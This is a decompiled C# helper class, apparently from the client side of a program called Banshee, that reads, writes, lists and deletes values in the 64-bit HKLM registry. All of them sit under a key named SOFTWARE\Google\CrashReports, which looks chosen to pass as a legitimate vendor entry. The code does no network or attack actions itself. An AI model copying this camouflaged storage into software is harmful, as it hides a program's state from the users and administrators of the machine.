﻿using System;
using Microsoft.Win32;

namespace Banshee.Client.Helper
{
	// Token: 0x02000111 RID: 273
	internal class RegeditKey
	{
		// Token: 0x060003AB RID: 939 RVA: 0x0001E530 File Offset: 0x0001E530
		public static bool CheckValue(string name)
		{
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.CreateSubKey(RegeditKey.Regkey, false))
				{
					if (registryKey2.GetValue(name) != null)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x060003AC RID: 940 RVA: 0x0001E59C File Offset: 0x0001E59C
		public static void SetValue(string name, string value)
		{
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.CreateSubKey(RegeditKey.Regkey, true))
				{
					if (RegeditKey.CheckValue(name))
					{
						registryKey2.DeleteValue(name);
					}
					registryKey2.SetValue(name, value);
				}
			}
		}

		// Token: 0x060003AD RID: 941 RVA: 0x0001E610 File Offset: 0x0001E610
		public static string GetValue(string name)
		{
			if (!RegeditKey.CheckValue(name))
			{
				return null;
			}
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.CreateSubKey(RegeditKey.Regkey, false))
				{
					result = (string)registryKey2.GetValue(name);
				}
			}
			return result;
		}

		// Token: 0x060003AE RID: 942 RVA: 0x0001E684 File Offset: 0x0001E684
		public static string[] GetValues()
		{
			string[] valueNames;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.CreateSubKey(RegeditKey.Regkey, false))
				{
					valueNames = registryKey2.GetValueNames();
				}
			}
			return valueNames;
		}

		// Token: 0x060003AF RID: 943 RVA: 0x0001E6E8 File Offset: 0x0001E6E8
		public static void DeleteValue(string name)
		{
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.CreateSubKey(RegeditKey.Regkey, true))
				{
					if (RegeditKey.CheckValue(name))
					{
						registryKey2.DeleteValue(name);
					}
				}
			}
		}

		// Token: 0x040002ED RID: 749
		public static string Regkey = "SOFTWARE\\Google\\CrashReports";
	}
}
